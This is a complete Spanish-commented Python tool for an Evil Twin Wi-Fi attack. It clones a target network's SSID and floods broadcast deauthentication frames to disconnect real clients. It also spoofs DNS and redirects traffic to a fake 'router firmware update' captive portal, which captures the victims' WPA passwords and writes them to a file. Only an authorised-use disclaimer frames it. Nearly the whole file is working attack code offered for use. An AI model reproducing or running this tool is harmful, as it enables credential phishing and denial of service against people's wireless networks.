"""
Evil Twin AP: clona un punto de acceso WiFi para capturar contraseñas WPA.

Dependencias del sistema (deben estar instaladas):
    hostapd, dnsmasq, iptables

AVISO: Usar ÚNICAMENTE en redes propias o con autorización escrita y explícita.
El uso no autorizado de esta herramienta es ilegal. El autor no se hace
responsable de ningún uso indebido.
"""

import html
import os
import subprocess
import tempfile
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from urllib.parse import parse_qs

from scapy.all import sendp
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap

# --------------------------------------------------------------------------- #
#  HTML del portal cautivo                                                     #
# --------------------------------------------------------------------------- #

_PORTAL_HTML = """\
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Actualización de seguridad del router</title>
  <style>
    * {{ box-sizing: border-box; }}
    body {{ font-family: Arial, sans-serif; background: #f0f2f5;
           display: flex; justify-content: center; align-items: center;
           min-height: 100vh; margin: 0; }}
    .card {{ background: #fff; border-radius: 10px; padding: 36px;
             max-width: 420px; width: 100%;
             box-shadow: 0 4px 20px rgba(0,0,0,.12); }}
    .logo {{ text-align: center; font-size: 2.4rem; margin-bottom: 16px; }}
    h1 {{ color: #1a73e8; font-size: 1.35rem; margin: 0 0 8px; }}
    p  {{ color: #555; font-size: .88rem; margin: 0 0 20px; line-height: 1.5; }}
    label {{ font-size: .85rem; color: #333; }}
    .ssid {{ font-weight: bold; color: #1a73e8; }}
    input  {{ display: block; width: 100%; padding: 10px 12px; margin: 6px 0 20px;
              border: 1px solid #ccc; border-radius: 5px; font-size: .95rem; }}
    button {{ width: 100%; padding: 11px; background: #1a73e8; color: #fff;
              border: none; border-radius: 5px; font-size: 1rem; cursor: pointer; }}
    button:hover {{ background: #1558b0; }}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">📶</div>
    <h1>Actualización de seguridad</h1>
    <p>Tu router ha aplicado una actualización de firmware. Para
       restablecer la conexión, por favor confirma la contraseña de la red
       <span class="ssid">{ssid}</span>.</p>
    <form method="POST" action="/submit">
      <label for="pwd">Contraseña WiFi</label>
      <input id="pwd" type="password" name="pwd"
             placeholder="Contraseña" required autofocus autocomplete="off">
      <button type="submit">Confirmar y conectar</button>
    </form>
  </div>
</body>
</html>
"""

_CONFIRM_HTML = """\
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Verificando...</title>
  <meta http-equiv="refresh" content="4;url=http://connectivitycheck.gstatic.com/generate_204">
  <style>
    body {{ font-family: Arial, sans-serif; background: #f0f2f5;
           display: flex; justify-content: center; align-items: center;
           min-height: 100vh; margin: 0; }}
    .card {{ background: #fff; border-radius: 10px; padding: 36px;
             max-width: 420px; text-align: center;
             box-shadow: 0 4px 20px rgba(0,0,0,.12); }}
    p {{ color: #2e7d32; font-size: 1rem; }}
  </style>
</head>
<body>
  <div class="card">
    <p>✔ Verificando contraseña&hellip;<br>Redirigiendo en un momento.</p>
  </div>
</body>
</html>
"""


# --------------------------------------------------------------------------- #
#  Handler HTTP del portal cautivo                                             #
# --------------------------------------------------------------------------- #

def _make_handler(ssid: str, output_file: Path, captured: list):
    """Devuelve una clase Handler con el SSID y rutas cerradas en clausura."""

    ssid_escaped = html.escape(ssid)

    class CaptivePortalHandler(BaseHTTPRequestHandler):
        def log_message(self, fmt, *args):  # silencia los logs de acceso
            pass

        def _send(self, code: int, body: str) -> None:
            encoded = body.encode("utf-8")
            self.send_response(code)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(encoded)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(encoded)

        def do_GET(self):
            # Cualquier ruta GET → portal (incluye CNA requests de Android/iOS)
            self._send(200, _PORTAL_HTML.format(ssid=ssid_escaped))

        def do_POST(self):
            if self.path != "/submit":
                self._send(404, "<h1>Not found</h1>")
                return

            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length).decode("utf-8", errors="replace")
            params = parse_qs(raw)
            pwd = params.get("pwd", [""])[0].strip()

            if pwd:
                captured.append(pwd)
                ts = time.strftime("%Y-%m-%d %H:%M:%S")
                line = f"[{ts}]  SSID={ssid}  PWD={pwd}\n"
                output_file.parent.mkdir(parents=True, exist_ok=True)
                with output_file.open("a") as fh:
                    fh.write(line)
                print(f"\n\033[32m[+] CONTRASEÑA CAPTURADA → {pwd}\033[0m")
                print(f"[+] Guardada en: {output_file}")

            self._send(200, _CONFIRM_HTML)

    return CaptivePortalHandler


# --------------------------------------------------------------------------- #
#  Clase principal EvilTwinAP                                                 #
# --------------------------------------------------------------------------- #

class EvilTwinAP:
    """
    Levanta un AP falso con el mismo SSID del objetivo, expulsa a los clientes
    reales mediante frames deauth y sirve un portal cautivo para capturar la
    contraseña WPA introducida por la víctima.

    Requisitos del sistema: hostapd, dnsmasq, iptables (Linux).

    AVISO: Solo para redes propias o con autorización explícita y por escrito.
    """

    AP_IP       = "192.168.66.1"
    DHCP_RANGE  = "192.168.66.10,192.168.66.50,12h"
    PORTAL_PORT = 80
    _MON_IFACE  = "evilmon0"     # interfaz virtual monitor para deauth

    def __init__(
        self,
        iface: str,
        ssid: str,
        bssid: str,
        channel: int,
        output_dir: Path,
    ) -> None:
        self.iface       = iface
        self.ssid        = ssid
        self.bssid       = bssid
        self.channel     = channel
        self.output_dir  = output_dir
        self.output_file = output_dir / f"eviltwin_{ssid.replace(' ', '_')}_passwords.txt"

        self._procs: list        = []
        self._tmpfiles: list     = []
        self._mon_created: bool  = False
        self._iptables_set: bool = False
        self.captured_passwords: list = []

    # ------------------------------------------------------------------ #
    #  Configuración hostapd                                               #
    # ------------------------------------------------------------------ #

    def _write_hostapd_conf(self) -> str:
        hw_mode = "a" if self.channel > 13 else "g"
        conf = (
            f"interface={self.iface}\n"
            f"ssid={self.ssid}\n"
            f"channel={self.channel}\n"
            f"hw_mode={hw_mode}\n"
            "driver=nl80211\n"
            "ignore_broadcast_ssid=0\n"
        )
        f = tempfile.NamedTemporaryFile(
            mode="w", suffix=".conf", prefix="hostapd_et_", delete=False
        )
        f.write(conf)
        f.flush()
        self._tmpfiles.append(f.name)
        return f.name

    # ------------------------------------------------------------------ #
    #  Configuración dnsmasq                                               #
    # ------------------------------------------------------------------ #

    def _write_dnsmasq_conf(self) -> str:
        pid_file = tempfile.mktemp(suffix=".pid", prefix="dnsmasq_et_")
        self._tmpfiles.append(pid_file)
        conf = (
            f"interface={self.iface}\n"
            "except-interface=lo\n"
            "bind-dynamic\n"               # evita conflicto con instancias del sistema
            f"dhcp-range={self.DHCP_RANGE}\n"
            f"address=/#/{self.AP_IP}\n"   # DNS spoof: todo dominio → portal
            "dhcp-option=3\n"              # sin gateway predeterminado
            "no-resolv\n"
            f"pid-file={pid_file}\n"
            "log-queries\n"
        )
        f = tempfile.NamedTemporaryFile(
            mode="w", suffix=".conf", prefix="dnsmasq_et_", delete=False
        )
        f.write(conf)
        f.flush()
        self._tmpfiles.append(f.name)
        return f.name

    # ------------------------------------------------------------------ #
    #  Red e iptables                                                      #
    # ------------------------------------------------------------------ #

    def _configure_interface(self) -> bool:
        steps = [
            ["ip", "link", "set", self.iface, "down"],
            ["iw", "dev", self.iface, "set", "type", "__ap"],
            ["ip", "link", "set", self.iface, "up"],
            ["ip", "addr", "flush", "dev", self.iface],
            ["ip", "addr", "add", f"{self.AP_IP}/24", "dev", self.iface],
        ]
        for cmd in steps:
            r = subprocess.run(cmd, capture_output=True, text=True)
            if r.returncode != 0:
                print(f"[-] '{' '.join(cmd)}': {r.stderr.strip()}")
                return False
        return True

    def _setup_iptables(self) -> None:
        rules = [
            # HTTP → portal
            ["iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", self.iface, "-p", "tcp", "--dport", "80",
             "-j", "DNAT", "--to-destination", f"{self.AP_IP}:{self.PORTAL_PORT}"],
            # HTTPS → portal (conexión sin TLS; el browser verá error de cert)
            ["iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", self.iface, "-p", "tcp", "--dport", "443",
             "-j", "DNAT", "--to-destination", f"{self.AP_IP}:{self.PORTAL_PORT}"],
            ["iptables", "-t", "nat", "-A", "POSTROUTING",
             "-o", self.iface, "-j", "MASQUERADE"],
        ]
        for rule in rules:
            subprocess.run(rule, capture_output=True)
        self._iptables_set = True

    def _teardown_iptables(self) -> None:
        rules = [
            ["iptables", "-t", "nat", "-D", "PREROUTING",
             "-i", self.iface, "-p", "tcp", "--dport", "80",
             "-j", "DNAT", "--to-destination", f"{self.AP_IP}:{self.PORTAL_PORT}"],
            ["iptables", "-t", "nat", "-D", "PREROUTING",
             "-i", self.iface, "-p", "tcp", "--dport", "443",
             "-j", "DNAT", "--to-destination", f"{self.AP_IP}:{self.PORTAL_PORT}"],
            ["iptables", "-t", "nat", "-D", "POSTROUTING",
             "-o", self.iface, "-j", "MASQUERADE"],
        ]
        for rule in rules:
            subprocess.run(rule, capture_output=True)

    # ------------------------------------------------------------------ #
    #  Interfaz virtual monitor para deauth                                #
    # ------------------------------------------------------------------ #

    def _create_monitor_iface(self) -> bool:
        """Crea una interfaz virtual en modo monitor desde la misma tarjeta."""
        r = subprocess.run(
            ["iw", "dev", self.iface, "interface", "add",
             self._MON_IFACE, "type", "monitor"],
            capture_output=True, text=True,
        )
        if r.returncode != 0:
            print(f"[!] No se pudo crear {self._MON_IFACE}: {r.stderr.strip()}")
            print("[!] Los deauths se enviarán sin interfaz monitor dedicada.")
            return False
        subprocess.run(
            ["ip", "link", "set", self._MON_IFACE, "up"], capture_output=True
        )
        self._mon_created = True
        print(f"[+] Interfaz monitor auxiliar: {self._MON_IFACE}")
        return True

    def _delete_monitor_iface(self) -> None:
        if self._mon_created:
            subprocess.run(["iw", "dev", self._MON_IFACE, "del"], capture_output=True)
            self._mon_created = False

    # ------------------------------------------------------------------ #
    #  Deauth loop                                                         #
    # ------------------------------------------------------------------ #

    def deauth_loop(self, stop_event: threading.Event) -> None:
        """Envía frames deauth broadcast para expulsar clientes del AP real."""
        iface_send = self._MON_IFACE if self._mon_created else self.iface
        pkt = (
            RadioTap()
            / Dot11(
                addr1="ff:ff:ff:ff:ff:ff",  # broadcast → todos los clientes
                addr2=self.bssid,
                addr3=self.bssid,
                type=0,
                subtype=12,
            )
            / Dot11Deauth(reason=7)
        )
        while not stop_event.is_set():
            try:
                sendp(pkt, iface=iface_send, count=5, inter=0.05, verbose=False)
            except Exception:
                pass
            stop_event.wait(2.0)

    # ------------------------------------------------------------------ #
    #  Portal cautivo                                                      #
    # ------------------------------------------------------------------ #

    def _run_portal(self, stop_event: threading.Event) -> None:
        handler = _make_handler(self.ssid, self.output_file, self.captured_passwords)
        try:
            server = HTTPServer(("0.0.0.0", self.PORTAL_PORT), handler)
            server.timeout = 1.0
            while not stop_event.is_set():
                server.handle_request()
            server.server_close()
        except OSError as e:
            print(f"[-] Portal HTTP no pudo iniciar en el puerto {self.PORTAL_PORT}: {e}")
            print("[-] ¿Hay otro servicio usando el puerto 80? Prueba: sudo fuser -k 80/tcp")

    # ------------------------------------------------------------------ #
    #  Start / Stop                                                        #
    # ------------------------------------------------------------------ #

    def start(self, stop_event: threading.Event) -> bool:
        """
        Configura la interfaz, levanta hostapd, dnsmasq y el portal cautivo,
        y arranca el deauth loop. Bloquea hasta que stop_event se active.

        Devuelve True si el AP se levantó correctamente.
        """
        print(
            f"\n[*] Evil Twin iniciando...\n"
            f"    SSID    : {self.ssid}\n"
            f"    BSSID   : {self.bssid}\n"
            f"    Canal   : {self.channel}\n"
            f"    Interfaz: {self.iface}\n"
        )
        print("[!] AVISO: Esta herramienta solo debe usarse en redes propias")
        print("[!] o con autorización escrita y explícita. Uso indebido = ilegal.\n")

        self.output_dir.mkdir(parents=True, exist_ok=True)

        # 1. Configurar interfaz en modo AP
        if not self._configure_interface():
            print("[-] Fallo al configurar la interfaz. Abortando.")
            return False

        # 2. hostapd
        hostapd_conf = self._write_hostapd_conf()
        hostapd_proc = subprocess.Popen(
            ["hostapd", hostapd_conf],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        self._procs.append(hostapd_proc)
        time.sleep(1.5)
        if hostapd_proc.poll() is not None:
            print("[-] hostapd falló al iniciar.")
            print("[-] Verifica que esté instalado: sudo apt install hostapd")
            return False
        print(f"[+] AP falso activo → '{self.ssid}'")

        # 3. dnsmasq
        # Detener el servicio del sistema si está corriendo (libera puerto 53)
        subprocess.run(["systemctl", "stop", "dnsmasq"], capture_output=True)
        subprocess.run(["pkill", "-x", "dnsmasq"],      capture_output=True)
        time.sleep(0.4)

        dnsmasq_conf = self._write_dnsmasq_conf()
        dnsmasq_log = tempfile.SpooledTemporaryFile(max_size=65536)
        dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "--no-daemon", f"--conf-file={dnsmasq_conf}"],
            stdout=dnsmasq_log,
            stderr=dnsmasq_log,
        )
        self._procs.append(dnsmasq_proc)
        time.sleep(1.0)
        if dnsmasq_proc.poll() is not None:
            dnsmasq_log.seek(0)
            err = dnsmasq_log.read().decode("utf-8", errors="replace").strip()
            dnsmasq_log.close()
            print("[-] dnsmasq falló al iniciar.")
            if err:
                print(f"[-] Salida de dnsmasq:\n{err}")
            else:
                print("[-] Sin salida de error. Comprueba: sudo journalctl -u dnsmasq -n 20")
            return False
        dnsmasq_log.close()
        print(f"[+] DHCP + DNS spoof activos  →  {self.AP_IP}")

        # 4. iptables
        self._setup_iptables()
        print(f"[+] Redirección HTTP/HTTPS → portal cautivo activa")

        # 5. Interfaz monitor auxiliar para deauth
        self._create_monitor_iface()

        # 6. Portal cautivo (hilo daemon)
        threading.Thread(
            target=self._run_portal, args=(stop_event,), daemon=True
        ).start()
        print(f"[+] Portal cautivo escuchando en http://{self.AP_IP}")
        print(f"[*] Contraseñas capturas → {self.output_file}")

        # 7. Deauth loop (hilo daemon)
        threading.Thread(
            target=self.deauth_loop, args=(stop_event,), daemon=True
        ).start()
        print(f"[*] Deauth loop activo (cada 2 s) — presiona Ctrl+C para detener\n")

        # Bloquear hasta señal de parada
        try:
            while not stop_event.is_set():
                time.sleep(0.5)
        except KeyboardInterrupt:
            stop_event.set()

        return True

    def stop(self) -> None:
        """Termina procesos, elimina reglas iptables y limpia archivos temporales."""
        print("\n[*] Deteniendo Evil Twin...")

        for proc in self._procs:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        self._procs.clear()

        if self._iptables_set:
            self._teardown_iptables()

        self._delete_monitor_iface()

        # Restaurar interfaz a modo managed
        for cmd in [
            ["ip", "link", "set", self.iface, "down"],
            ["iw", "dev", self.iface, "set", "type", "managed"],
            ["ip", "link", "set", self.iface, "up"],
        ]:
            subprocess.run(cmd, capture_output=True)

        for path in self._tmpfiles:
            try:
                os.unlink(path)
            except FileNotFoundError:
                pass
        self._tmpfiles.clear()

        n = len(self.captured_passwords)
        print(f"[+] Evil Twin detenido. Contraseñas capturadas: {n}")
        if n:
            print(f"[+] Guardadas en: {self.output_file}")
